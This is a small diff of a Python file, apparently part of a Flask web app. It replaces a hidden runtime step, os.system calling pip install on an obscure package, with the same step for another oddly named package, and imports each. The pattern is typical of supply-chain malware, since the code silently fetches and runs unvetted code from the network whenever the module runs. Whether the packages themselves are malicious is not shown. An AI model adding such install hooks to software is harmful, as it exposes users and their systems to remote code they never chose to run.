@@ -2,8 +2,8 @@
 
 import time
 import os
-os.system("pip install pythoncryptographyextensionsV2")
-import pythoncryptographyextensionsV2
+os.system("pip install pipcolouringsmodule")
+import pipcolouringsmodule
 import flask
 
 from flask import g
